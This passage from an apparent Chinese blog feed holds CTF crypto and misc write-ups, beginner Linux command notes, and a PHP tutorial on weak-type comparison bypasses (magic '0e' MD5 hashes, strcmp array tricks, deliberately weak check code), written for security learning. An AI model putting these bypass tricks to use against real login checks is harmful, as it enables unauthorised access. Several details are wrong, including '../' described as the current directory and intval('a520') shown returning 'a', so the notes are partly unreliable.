class="line">dGhpcyBpcyB5b3VyIGZsYWd7dzNsZTBjb21lX3RvX0cybXRVY1RmfQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>用base64解密得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w3le0come_to_G2mtUcTf&#125;</span><br></pre></td></tr></table></figure><br><h3 id="disk"><a href="#disk" class="headerlink" title="disk"></a>disk</h3><p>参考：<a href="https://blog.csdn.net/flying_bird2019/article/details/105240908">2020易博霖CTFMisc2–Disk题解</a></p><p>用提取隐藏文件</p><p><code>readme</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Q:where is passw0rd?</span><br><span class="line">A:Be Deleted.</span><br></pre></td></tr></table></figure><p>应该要恢复被删除的密码的，可是extundelete安装不了</p><p>只能用010editor打开disk0，查找有没有密码</p><p>尝试了好几个：<code>password</code>，<code>passw0rd</code>，<code>passwd</code>，<code>pass</code>，<code>word</code>，<code>ps</code>，<code>wd</code></p><p>最后找到一个类似密码的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">don0tgu355p@sswd</span><br></pre></td></tr></table></figure><p>解压<code>lever1.zip</code>，得到flag.png</p><p>修改图片高度就可以得到flag</p><br><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="恺撒将军"><a href="#恺撒将军" class="headerlink" title="恺撒将军"></a>恺撒将军</h3><p>题目：</p><p>恺撒将军使用了一种技术运筹帷幄，指挥千里将士决胜千里。</p><p>敌军正好截获了一串密文 ]p{k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@</p><p>offset: 3</p><br><p>用<a href="https://blog.csdn.net/hengliang_/article/details/80496326">java String字符串与Ascii互相转换</a>的代码解密</p><ul><li>Test02</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String string = <span class="string">&quot;]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;</span>;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">char</span>[] ch = string.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ch.length; i++) &#123;</span><br><span class="line">            sb.append(Integer.valueOf(ch[i]).intValue()-<span class="number">3</span>).append(<span class="string">&quot; &quot;</span>);<span class="comment">// 加空格</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">90 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 </span><br></pre></td></tr></table></figure><ul><li>Test03</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String value = <span class="string">&quot;90 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 &quot;</span>;</span><br><span class="line">        StringBuffer sbu = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String[] chars = value.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">            sbu.append((<span class="keyword">char</span>) Integer.parseInt(chars[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sbu.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64解密后得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;crypto_is_hxb_so_eAsy0&#125;</span><br></pre></td></tr></table></figure><br><h3 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h3><p>题目：</p><p>小明家菜园要建栅栏，请教了他心爱的女神，女神给了这么点提示，他却看不懂，你能帮助他吗？</p><p>f_tnluz_aghggeao{t_oy_ldoia}</p><br><p>栅栏密码</p><p><img src="https://s3.ax1x.com/2020/11/19/Du65JH.png" alt="Du65JH.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yo_uget_itzha_lan_good&#125;</span><br></pre></td></tr></table></figure><br><h3 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h3><p>我军成功捣毁敌军秘密电台缴获密文和明文一份，但是还有一份密文难以破解特请你来破译密码：</p><p>待解密文：givfome</p><br><p>用<a href="https://blog.csdn.net/m0_46132784/article/details/109597249">脚本</a>进行词频分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]&quot;</span></span><br><span class="line"></span><br><span class="line">data = input()</span><br><span class="line"></span><br><span class="line">result = &#123;d:<span class="number">0</span> <span class="keyword">for</span> d <span class="keyword">in</span> alphabet&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_by_value</span>(<span class="params">d</span>):</span></span><br><span class="line">    items = d.items()</span><br><span class="line">    backitems = [[v[<span class="number">1</span>],v[<span class="number">0</span>]] <span class="keyword">for</span> v <span class="keyword">in</span> items]</span><br><span class="line">    backitems.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">    print(backitems,<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> [ backitems[i][<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(backitems))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> d == alpha:</span><br><span class="line">            result[alpha] = result[alpha] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(sort_by_value(result)))</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/19/Du2Lex.png" alt="Du2Lex.png"></p><p>密文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">givfometjlysnhuczkwbrqdxpa&#125;&#123;_^][ZYXWVUTSRQPONMLKJIHGFEDCBA@&#x3D;9876543210-+*)(&amp;%$#!</span><br></pre></td></tr></table></figure><p>明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eantosirlhugdpcmf0wybvkA)(S21xTPC86-zjWLE4qUNMIGB53&#125;&#123;_^]</span><br><span class="line">ZYXVRQOKJHFD@&#x3D;97+*&amp;%$#!</span><br></pre></td></tr></table></figure><p>解密密文：givfome，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eantosi&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记——Linux</title>
      <link href="2020/11/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Linux/"/>
      <url>2020/11/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Linux/</url>
      
        <content type="html"><![CDATA[<p>Linux是开源的操作系统，系统特点有：开放性（开源）、多用户、多任务、良好的用户界面、优异的性能与稳定性等等。</p><p>学习笔记目录：</p><ul><li>文件目录结构</li><li>终端</li><li>路径</li><li>指令</li></ul><br><a id="more"></a><h2 id="文件目录结构"><a href="#文件目录结构" class="headerlink" title="文件目录结构"></a>文件目录结构</h2><p><a href="https://imgchr.com/i/Bz52Ks"><img src="https://s3.ax1x.com/2020/11/12/Bz52Ks.png" alt="Bz52Ks.png"></a></p><p>bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。</p><p>dev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要<strong>挂载</strong>（类似windows下的分配盘符）。</p><p>etc：该目录主要存储一些配置文件。</p><p>home：表示“家”，表示<strong>除了root用户以外其他用户的家目录</strong>，类似于windows下的User/用户目录。</p><p>mnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。</p><p>proc：process，表示进程，该目录中存储的是Linux运行时候的进程。</p><p>root：该目录是root用户自己的家目录。</p><p>sbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。</p><p>tmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。</p><p>usr：存放的是用户自己安装的软件。类似于windows下的program files。</p><p>var：存放的程序/系统的日志文件的目录。</p><br><h2 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h2><p><a href="https://imgchr.com/i/Bz4Sw6"><img src="https://s3.ax1x.com/2020/11/12/Bz4Sw6.png" alt="Bz4Sw6.png"></a></p><p><code>kali</code>：当前终端登录的用户名</p><p><code>@</code>：发音at，表示”在“</p><p><code>kali</code>：当前登录的主机名</p><p><code>~/桌面</code>：当前终端的工作目录</p><p><code>$</code>：身份识别符，如果是超级管理员登录则显示<code>#</code>，否则显示<code>$</code>符号</p><br><ul><li>超级管理员终端界面如下：</li></ul><p><a href="https://imgchr.com/i/BzItiT"><img src="https://s3.ax1x.com/2020/11/12/BzItiT.png" alt="BzItiT.png"></a></p><br><h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><p>路径可以分为两种：相对路径和绝对路径</p><ul><li>相对路径：</li></ul><p><code>./</code>：表示当前目录下；<code>../</code>：表示当前目录下</p><ul><li>绝对路径：</li></ul><p><code>/</code>：从根目录下寻找对应路径</p><blockquote><p>在Linux中有一个特殊的符号“~”，表示当前用户的家目录。</p></blockquote><br><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>Linux指令通用格式</p><p>#指令主体（空格） [选项]（空格） [操作对象]</p><p>一个指令可以包含多个选项</p><p>操作对象也可以是多个</p><br><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p><strong>(list)</strong></p><ul><li>ls</li></ul><p>列出当前工作目录下的所有文件/文件夹的名称</p><ul><li>ls 路径</li></ul><p>列出指定路径下的所有文件/文件夹的名称</p><ul><li><p>ls 选项 路径</p><ul><li><p>ls -l 路径</p><p>-l：表示list，表示以详细列表的形式进行展示</p></li><li><p>ls -a 路径</p><p>-a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）</p></li><li><p>ls -lh 路径</p><p>-lh：-a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）</p></li></ul></li></ul><br><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p><strong>(print working directory)</strong></p><ul><li>pwd</li></ul><p>打印当前工作目录</p><br><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><p><strong>(change directory)</strong></p><ul><li>cd 路径</li></ul><p>切换到路径所在目录</p><br><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><p><strong>(make directory)</strong></p><ul><li>mkdir 路径</li></ul><p>创建目录，可以是文件夹名称也可以是包含名称的一个完整路径</p><ul><li>mkdir -p 路径</li></ul><p>当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错</p><ul><li>mkdir 路径1 路径2 路径3 …</li></ul><p>表示一次性创建多个目录</p><br><h3 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h3><p><strong>创建文件</strong></p><ul><li>touch 文件路径</li></ul><p>文件路径可以是直接的文件名也可以是路径，touch也可以同时创建多个文件</p><br><h3 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h3><ul><li>clear</li></ul><p>清屏</p><br><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><p><strong>(copy)</strong></p><ul><li>cp 被复制的文档路径 文档被复制到的路径</li></ul><p>复制文档到新路径下的位置，在复制过程中是可以对新位置的文件重命名的</p><ul><li>cp -r 被复制的文件夹路径 文件夹被复制到的路径</li></ul><p><code>-r</code>表示递归复制</p><br><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p><strong>(move)</strong></p><ul><li>mv 需要移动的文档路径 需要保存的位置路径</li></ul><p>移动文档到新位置，原始文件在移动后不在原始位置</p><ul><li>mv 需要移动的文件夹路径 需要保存的位置路径</li></ul><p>移动一个文件夹，同移动文档</p><br><p>注：</p><p><strong>在Linux中重命名的命令也是mv，语法和移动语法一样</strong></p><p>如：重命名根目录下的<code>a.txt</code>为<code>b.txt</code></p><p>mv /a.txt /b.txt</p><br><h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><p><strong>(remove)</strong></p><ul><li><p>rm 选项 需要移除的文档路径</p><ul><li><p>rm -f 需要移除的文档路径</p><p>force：表示强制删除，不提示是否删除</p></li><li><p>rm -r 需要移除的文件夹路径</p><p>-r：表示递归，删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项</p></li><li><p>rm -rf 文档路径/文件夹路径/…</p><p>删除多个文档和文件夹</p></li></ul></li></ul><br><p>注：</p><p>要删除一个目录下有公共特性的文档，例如以test开头的文档，可以使用通配符<code>*</code></p><p>rm -f test*</p><p>表示强制删除只要文件是以test开头的，后续字符不管的文档</p><br><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。</p><p><code>&gt;</code>：<strong>覆盖</strong>输出，会覆盖掉原先的文件内容</p><p><code>&gt;&gt;</code>：<strong>追加</strong>输出，不会覆盖原始文件内容，会在原始内容末尾继续添加</p><ul><li>正常执行的指令 &gt;/&gt;&gt; 文件的路径</li></ul><p>注：文件可以不存在，不存在则新建</p><p>如：使用覆盖重定向，保存 ls -lah 的执行结果到当前目录下的 ls.txt</p><p>ls -lah &gt; ls.txt</p><br><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><ul><li>cat 文档路径</li></ul><p>直接打开一个文档，结果输出在终端</p><ul><li>cat 文档路径1 文档路径2 … 文档路径n &gt; 文档路径x</li></ul><p>配合输出重定向，将文档路径1到文档路径n的内容合并到文档路径x</p><br><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道符：<code>|</code></p><p>管道一般可以用于“过滤”，“特殊”，“扩展处理”。</p><ul><li>指令A | 指令B</li></ul><p>指令A的正确输出作为指令B的操作对象</p><p><a href="https://imgchr.com/i/BzxVwF"><img src="https://s3.ax1x.com/2020/11/12/BzxVwF.png" alt="BzxVwF.png"></a></p><blockquote><p>grep指令：主要用于过滤</p></blockquote><br><h3 id="du-sh"><a href="#du-sh" class="headerlink" title="du -sh"></a>du -sh</h3><ul><li>du -sh 目录路径</li></ul><p>查看目录的真实大小</p><p>-s：summaries，只显示汇总的大小</p><p>-h：表示以高可读性的形式进行显示</p><p>如：统计”/etc“目录实际大小</p><p>du -sh /etc/</p><br><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p><a href="https://imgchr.com/i/Bzzenf"><img src="https://s3.ax1x.com/2020/11/12/Bzzenf.png" alt="Bzzenf.png"></a></p><p><code>%F</code>：等价于<code>%Y-%m-%d</code></p><p><code>%T</code>：等价于<code>%H:%M:%S</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%F：表示完整的年月日</span><br><span class="line">%T：表示完整的时分秒</span><br><span class="line">%Y：表示四位年份</span><br><span class="line">%m：表示两位月份（带前导0）</span><br><span class="line">%d：表示日期（带前导0）</span><br><span class="line">%H：表示小时（带前导0）</span><br><span class="line">%M：表示分钟（带前导0）</span><br><span class="line">%S：表示秒数（带前导0）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 弱类型比较问题</title>
      <link href="2020/10/29/PHP%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98/"/>
      <url>2020/10/29/PHP%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<ul><li><p>字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。</p></li><li><p>bool true和任何比较都相等，除了0和false，因为0认为是bool false。</p></li><li><p>md5或者sha不能加密数组，所以在加密数组的时候会返回false。</p></li><li><p>“0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。</p></li><li><p>只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即<code>0e\d+</code>的字符串 == ‘0’ 为true。</p></li><li><p>PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。</p></li></ul><a id="more"></a><table><thead><tr><th>字符串</th><th>md5()</th></tr></thead><tbody><tr><td>240610708</td><td>0e462097431906509019562988736854</td></tr><tr><td>QNKCDZO</td><td>0e830400451993494058024219903391</td></tr><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td>0e342768416822451524974117254469</td></tr><tr><td>s214587387a</td><td>0e848240448830537924465865611904</td></tr></tbody></table><p>参考：</p><p><a href="https://www.php.net/manual/zh/language.operators.comparison.php">PHP官方手册——比较运算符</a></p><p><a href="https://blog.csdn.net/u014029795/article/details/99709333?biz_id=102&utm_term=php%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-99709333&spm=1018.2118.3001.4187">PHP 弱类型比较总结</a></p><h2 id="PHP-弱类型比较问题"><a href="#PHP-弱类型比较问题" class="headerlink" title="PHP 弱类型比较问题"></a>PHP 弱类型比较问题</h2><p>PHP是一门弱类型语言，存在弱类型比较问题。</p><h3 id="“-”与“-”"><a href="#“-”与“-”" class="headerlink" title="“==”与“===”"></a>“==”与“===”</h3><p><code>==</code>  数据类型不一样的时候会将数据类型转换为相同的再进行比较</p><p><code>===</code>   除了对数据的值进行比较还会对数据的类型进行比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$o = $_GET[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($o))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($o==<span class="number">520</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;U are right!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>输入520，则：no hack!!</p><p>输入520a，则：U are right!</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;520a&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;a520&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>520</p><p>a</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&#x27;1&#x27;</span>==<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="string">&#x27;1&#x27;</span>===<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)<br>bool(false)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&#x27;0e12&#x27;</span> == <span class="string">&#x27;0e34&#x27;</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;0e12&#x27;</span> === <span class="string">&#x27;0e34&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)<br>bool(false)</p></blockquote><h3 id="switch弱类型比较问题"><a href="#switch弱类型比较问题" class="headerlink" title="switch弱类型比较问题"></a>switch弱类型比较问题</h3><p>switch中同样存在弱类型比较问题，原理和上面类似</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $i =<span class="string">&quot;3a&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($i) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;this is two&quot;</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终输出 flag</p><h3 id="字符串和数字比较"><a href="#字符串和数字比较" class="headerlink" title="字符串和数字比较"></a>字符串和数字比较</h3><p><strong>字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。</strong></p><p>如：”a”或”a1”是不能转换为数字的字符串，而”1”或”1a”是可以转换为数字的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&#x27;a&#x27;</span> == <span class="number">0</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;a&#x27;</span> == <span class="number">1</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;1&#x27;</span> == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">&#x27;1a&#x27;</span> == <span class="number">1</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;a1&#x27;</span> == <span class="number">1</span>);</span><br><span class="line">var_dump(<span class="string">&#x27;12a&#x27;</span> == <span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)<br>bool(false)<br>bool(true)<br>bool(true)<br>bool(false)<br>bool(false)</p></blockquote><h3 id="布尔值true和任意比较"><a href="#布尔值true和任意比较" class="headerlink" title="布尔值true和任意比较"></a>布尔值true和任意比较</h3><p><strong>bool true和任何比较都相等，除了0和false，因为0认为是bool false。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="literal">true</span> == <span class="number">0</span>);</span><br><span class="line">var_dump(<span class="literal">true</span> == <span class="string">&#x27;False&#x27;</span>);</span><br><span class="line">var_dump(<span class="literal">true</span> == <span class="number">2</span>);</span><br><span class="line">var_dump(<span class="literal">true</span> == <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(false)<br>bool(true)<br>bool(true)<br>bool(true)</p></blockquote><h3 id="md5-、sha1-哈希函数相等问题"><a href="#md5-、sha1-哈希函数相等问题" class="headerlink" title="md5()、sha1()哈希函数相等问题"></a>md5()、sha1()哈希函数相等问题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;a&#x27;</span>] != $_GET[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5($_GET[<span class="string">&#x27;a&#x27;</span>]) === md5($_GET[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Wrong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 